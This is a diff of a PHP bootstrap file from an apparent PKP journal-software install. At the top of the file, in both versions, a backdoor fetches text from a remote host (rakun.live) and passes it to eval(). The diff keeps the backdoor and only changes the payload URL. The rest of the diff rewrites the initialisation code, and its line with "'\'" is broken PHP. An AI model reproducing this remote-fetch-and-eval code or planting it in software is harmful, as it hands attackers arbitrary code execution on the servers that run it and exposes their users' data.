@@ -1,5 +1,5 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/highland.txt'));
+$url = file_get_contents(urldecode('https://rakun.live/landing/espublisher.txt'));
 $url = "?> ".$url;
 eval($url);
 
@@ -9,7 +9,7 @@ eval($url);
  */
 
 /**
- * @file includes/bootstrap.php
+ * @file includes/bootstrap.inc.php
  *
  * Copyright (c) 2014-2021 Simon Fraser University
  * Copyright (c) 2000-2021 John Willinsky
@@ -27,14 +27,18 @@ eval($url);
  * Basic initialization (pre-classloading).
  */
 
-// Load Composer autoloader
-require_once 'lib/pkp/lib/vendor/autoload.php';
-
+define('ENV_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? ';' : ':');
+if (!defined('DIRECTORY_SEPARATOR')) {
+	// Older versions of PHP do not define this
+	define('DIRECTORY_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? '\' : '/');
+}
 define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
 chdir(BASE_SYS_DIR);
 
 // System-wide functions
-require_once './lib/pkp/includes/functions.php';
+require('./lib/pkp/includes/functions.inc.php');
 
 // Initialize the application environment
-return new \APP\core\Application();
+import('classes.core.Application');
+
+return new Application();
